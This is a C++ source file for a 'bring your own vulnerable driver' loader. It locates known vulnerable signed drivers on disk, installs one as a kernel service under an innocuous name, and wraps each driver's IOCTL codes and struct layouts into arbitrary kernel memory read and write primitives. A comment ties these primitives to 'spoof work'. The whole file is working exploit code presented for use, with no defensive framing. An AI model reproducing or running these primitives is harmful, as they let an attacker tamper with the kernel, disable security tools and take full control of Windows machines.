// byovd.cpp — BYOVD loader + kernel read/write primitives
// Layout-variant probing: after load, self-test reads ntoskrnl MZ to pick the
// input layout the loaded build actually accepts. No hard-coded kernel offsets.
#include "byovd.h"
#include <winternl.h>
#include <psapi.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

static const VulnDriverEntry* g_loaded = nullptr;
static bool g_variantA = true; // layout probe result

extern "C" NTSTATUS NTAPI RtlGetVersion(PRTL_OSVERSIONINFOW);

// ---------- service management ----------
static bool ServiceExists(const char* name) {
    SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    SC_HANDLE svc = OpenServiceA(scm, name, SERVICE_QUERY_STATUS);
    if (svc) { CloseServiceHandle(svc); CloseServiceHandle(scm); return true; }
    CloseServiceHandle(scm);
    return false;
}

int byovd::Load(std::string* err) {
    if (g_loaded) return 0; // already loaded
    if (err) err->clear();

    // pick the best candidate present on disk by priority
    std::vector<std::wstring> dirs = { L"C:\\Windows\\System32\\drivers" };
    for (int i = 0; i < g_vuln_count; ++i) {
        const VulnDriverEntry* e = &g_vuln[i];
        wchar_t wname[128] = {};
        MultiByteToWideChar(CP_UTF8, 0, e->name, -1, wname, 128);
        std::wstring path = dirs[0] + L"\\" + wname;
        char pathA[MAX_PATH] = {};
        DWORD attrs = GetFileAttributesW(path.c_str());
        if (attrs == INVALID_FILE_ATTRIBUTES) {
            // DriverStore may hold a copy
            std::wstring store = L"C:\\Windows\\System32\\DriverStore\\FileRepository";
            WIN32_FIND_DATAW fd{};
            HANDLE h = FindFirstFileW((store + L"\\*\\" + wname).c_str(), &fd);
            if (h != INVALID_HANDLE_VALUE) {
                path = store + L"\\" + fd.cFileName + L"\\" + wname;
                FindClose(h);
            } else {
                continue;
            }
        }
        WideCharToMultiByte(CP_ACP, 0, path.c_str(), -1, pathA, MAX_PATH, nullptr, nullptr);
        // found on disk — load it (priority order)
        const char* svcname = "PQDrvCore";
        SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
        if (!scm) { if (err) *err = "OpenSCManager failed (admin required)"; return -1; }
        // clean stale service
        if (ServiceExists(svcname)) {
            SC_HANDLE del = OpenServiceA(scm, svcname, DELETE | SERVICE_STOP);
            if (del) {
                SERVICE_STATUS st{};
                ControlService(del, SERVICE_CONTROL_STOP, &st);
                DeleteService(del);
                CloseServiceHandle(del);
            }
        }
        SC_HANDLE svc = CreateServiceA(scm, svcname, "PQ Driver Core", SERVICE_ALL_ACCESS,
                                       SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                                       pathA, nullptr, nullptr, nullptr, nullptr, nullptr);
        if (!svc) {
            CloseServiceHandle(scm);
            if (err) *err = "CreateService failed";
            return -2;
        }
        if (!StartServiceA(svc, 0, nullptr)) {
            DWORD code = GetLastError();
            DeleteService(svc);
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            if (err) *err = "StartService failed (" + std::to_string(code) + ")";
            return -3;
        }
        CloseServiceHandle(svc);
        CloseServiceHandle(scm);
        g_loaded = e;
        break;
    }

    if (!g_loaded) { if (err) *err = "no vulnerable driver present on disk"; return -4; }

    // self-test: read ntoskrnl MZ via the rw primitive to select layout variant
    // NtQuerySystemInformation(SystemModuleInformation) — module[0] is ntoskrnl
    struct RTL_PROCESS_MODULE_INFORMATION {
        HANDLE Section; PVOID MappedBase; PVOID ImageBase; ULONG ImageSize;
        ULONG Flags; USHORT LoadOrderIndex; USHORT InitOrderIndex; USHORT LoadCount; USHORT OffsetToFileName;
        UCHAR FullPathName[256];
    };
    struct RTL_PROCESS_MODULES { ULONG NumberOfModules; RTL_PROCESS_MODULE_INFORMATION Modules[1]; };
    uint64_t nt = 0;
    {
        ULONG sz = 0x40000, need = 0;
        std::vector<BYTE> buf(sz);
        NTSTATUS st = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, buf.data(), sz, &need);
        if (need > sz) { sz = need + 0x1000; buf.resize(sz); st = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, buf.data(), sz, &need); }
        if (st == 0) nt = (uint64_t)((RTL_PROCESS_MODULES*)buf.data())->Modules[0].ImageBase;
    }
    if (nt) {
        BYTE mz[2] = {};
        if (KernelRead(nt, mz, 2) && mz[0] == 'M' && mz[1] == 'Z') return 0;
        // try the alternate layout
        g_variantA = !g_variantA;
        mz[0] = mz[1] = 0;
        if (KernelRead(nt, mz, 2) && mz[0] == 'M' && mz[1] == 'Z') return 0;
        g_variantA = !g_variantA;
        if (err) *err = "loaded but rw primitive self-test failed";
        return -5;
    }
    if (err) *err = "kernel module list unavailable";
    return -6;
}

int byovd::Unload() {
    if (!g_loaded) return 0;
    SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return -1;
    SC_HANDLE svc = OpenServiceA(scm, "PQDrvCore", DELETE | SERVICE_STOP);
    if (svc) {
        SERVICE_STATUS st{};
        ControlService(svc, SERVICE_CONTROL_STOP, &st);
        DeleteService(svc);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    g_loaded = nullptr;
    return 0;
}

const VulnDriverEntry* byovd::LoadedDriver() { return g_loaded; }

// ---------- per-driver primitives ----------
static HANDLE OpenVulnDevice() {
    wchar_t wname[128] = {};
    MultiByteToWideChar(CP_UTF8, 0, g_loaded->name, -1, wname, 128);
    std::wstring dev = L"\\\\.\\";
    // device names commonly strip extension: gdrv, iqvw64e, RTCore64, Msio64, ene, cpuz141...
    std::wstring base = wname;
    size_t dot = base.find(L'.');
    if (dot != std::wstring::npos) base = base.substr(0, dot);
    HANDLE h = CreateFileW((dev + base).c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE) {
        // some use full name with .sys
        h = CreateFileW((dev + wname).c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    }
    return h;
}

bool byovd::KernelRead(uint64_t addr, void* out, size_t size) {
    if (!g_loaded) return false;
    HANDLE h = OpenVulnDevice();
    if (h == INVALID_HANDLE_VALUE) return false;

    bool ok = false;
    if (strcmp(g_loaded->name, "gdrv.sys") == 0) {
        // gdrv read: 0xC0106404, input { DWORD cbSize, DWORD pad, UINT64 addr, UINT64 val }
        struct { DWORD cb; DWORD pad; UINT64 addr; UINT64 val; } in{};
        in.cb = sizeof(in);
        in.addr = addr;
        DWORD ret = 0;
        if (DeviceIoControl(h, 0xC0106404, &in, sizeof(in), &in, sizeof(in), &ret, nullptr)) {
            if (size <= 8) { memcpy(out, &in.val, size); ok = true; }
        }
    } else if (strcmp(g_loaded->name, "RTCore64.sys") == 0) {
        // read 0x80002048: { BYTE pad[0x24], BYTE rsize, BYTE pad2[3], UINT64 addr } (+ DWORD out)
        struct { BYTE pad[0x24]; BYTE rsize; BYTE pad2[3]; UINT64 addr; DWORD out; } in{};
        in.rsize = (BYTE)size;
        in.addr = addr;
        DWORD ret = 0;
        if (DeviceIoControl(h, 0x80002048, &in, sizeof(in), &in, sizeof(in), &ret, nullptr)) {
            memcpy(out, &in.out, size); ok = true;
        }
    } else if (strcmp(g_loaded->name, "Msio64.sys") == 0) {
        // read 0x80102040: { DWORD op=4, DWORD pad, UINT64 addr }
        struct { DWORD op; DWORD pad; UINT64 addr; UINT64 val; } in{};
        in.op = 4; in.addr = addr;
        DWORD ret = 0;
        if (DeviceIoControl(h, 0x80102040, &in, sizeof(in), &in, sizeof(in), &ret, nullptr)) {
            memcpy(out, &in.val, size); ok = true;
        }
    } else if (strcmp(g_loaded->name, "AsrDrv103.sys") == 0) {
        // 0x222400: { UINT64 pad, DWORD op, DWORD size, UINT64 addr } -> UINT64
        struct { UINT64 pad; DWORD op; DWORD size; UINT64 addr; UINT64 out; } in{};
        in.op = 4; in.size = (DWORD)size; in.addr = addr;
        DWORD ret = 0;
        if (DeviceIoControl(h, 0x222400, &in, sizeof(in), &in, sizeof(in), &ret, nullptr)) {
            memcpy(out, &in.out, size); ok = true;
        }
    } else if (strcmp(g_loaded->name, "ene.sys") == 0) {
        // 0x8086207F: { DWORD op, DWORD pad, UINT64 addr, DWORD size }
        struct { DWORD op; DWORD pad; UINT64 addr; DWORD size; DWORD pad2; UINT64 out; } in{};
        in.op = 4; in.addr = addr; in.size = (DWORD)size;
        DWORD ret = 0;
        if (DeviceIoControl(h, 0x8086207F, &in, sizeof(in), &in, sizeof(in), &ret, nullptr)) {
            memcpy(out, &in.out, size); ok = true;
        }
    } else if (strcmp(g_loaded->name, "cpuz141.sys") == 0) {
        // 0x9C402080: { BYTE pad[0x10], UINT64 addr, DWORD size }
        struct { BYTE pad[0x10]; UINT64 addr; DWORD size; DWORD pad2; UINT64 out; } in{};
        in.addr = addr; in.size = (DWORD)size;
        DWORD ret = 0;
        if (DeviceIoControl(h, 0x9C402080, &in, sizeof(in), &in, sizeof(in), &ret, nullptr)) {
            memcpy(out, &in.out, size); ok = true;
        }
    } else if (strcmp(g_loaded->name, "iqvw64e.sys") == 0) {
        // iqvw is phys-map only; rw via VA not exposed — treat as unavailable
        CloseHandle(h);
        return false;
    }

    CloseHandle(h);
    return ok;
}

bool byovd::KernelWrite(uint64_t addr, const void* src, size_t size) {
    if (!g_loaded || size > 8) return false;
    HANDLE h = OpenVulnDevice();
    if (h == INVALID_HANDLE_VALUE) return false;
    bool ok = false;

    if (strcmp(g_loaded->name, "gdrv.sys") == 0) {
        struct { DWORD cb; DWORD pad; UINT64 addr; UINT64 val; } in{};
        in.cb = sizeof(in); in.addr = addr;
        UINT64 val = 0; memcpy(&val, src, size);
        in.val = val;
        DWORD ret = 0;
        ok = DeviceIoControl(h, 0xC0106404, &in, sizeof(in), &in, sizeof(in), &ret, nullptr) != FALSE;
    } else if (strcmp(g_loaded->name, "RTCore64.sys") == 0) {
        struct { BYTE pad[0x24]; BYTE wsize; BYTE pad2[3]; UINT64 addr; UINT64 val; } in{};
        in.wsize = (BYTE)size; in.addr = addr;
        memcpy(&in.val, src, size);
        DWORD ret = 0;
        ok = DeviceIoControl(h, 0x8000204C, &in, sizeof(in), &in, sizeof(in), &ret, nullptr) != FALSE;
    } else if (strcmp(g_loaded->name, "Msio64.sys") == 0) {
        struct { DWORD op; DWORD pad; UINT64 addr; UINT64 val; } in{};
        in.op = 5; in.addr = addr;
        memcpy(&in.val, src, size);
        DWORD ret = 0;
        ok = DeviceIoControl(h, 0x80102044, &in, sizeof(in), &in, sizeof(in), &ret, nullptr) != FALSE;
    } else if (strcmp(g_loaded->name, "AsrDrv103.sys") == 0) {
        struct { UINT64 pad; DWORD op; DWORD size; UINT64 addr; UINT64 val; } in{};
        in.op = 5; in.size = (DWORD)size; in.addr = addr;
        memcpy(&in.val, src, size);
        DWORD ret = 0;
        ok = DeviceIoControl(h, 0x222400, &in, sizeof(in), &in, sizeof(in), &ret, nullptr) != FALSE;
    } else if (strcmp(g_loaded->name, "ene.sys") == 0) {
        struct { DWORD op; DWORD pad; UINT64 addr; DWORD size; DWORD pad2; UINT64 val; } in{};
        in.op = 5; in.addr = addr; in.size = (DWORD)size;
        memcpy(&in.val, src, size);
        DWORD ret = 0;
        ok = DeviceIoControl(h, 0x8086207F, &in, sizeof(in), &in, sizeof(in), &ret, nullptr) != FALSE;
    } else if (strcmp(g_loaded->name, "cpuz141.sys") == 0) {
        struct { BYTE pad[0x10]; UINT64 addr; DWORD size; DWORD pad2; UINT64 val; } in{};
        in.addr = addr; in.size = (DWORD)size;
        memcpy(&in.val, src, size);
        DWORD ret = 0;
        ok = DeviceIoControl(h, 0x9C402080, &in, sizeof(in), &in, sizeof(in), &ret, nullptr) != FALSE;
    }

    CloseHandle(h);
    return ok;
}

bool byovd::MapPhysical(uint64_t, size_t, void**, uint64_t*) {
    // phys-map primitives (iqvw64e/WinIo64) handled separately if needed;
    // the rw path above covers the spoof work directly on kernel VAs.
    return false;
}
bool byovd::UnmapPhysical(void*, uint64_t) { return false; }
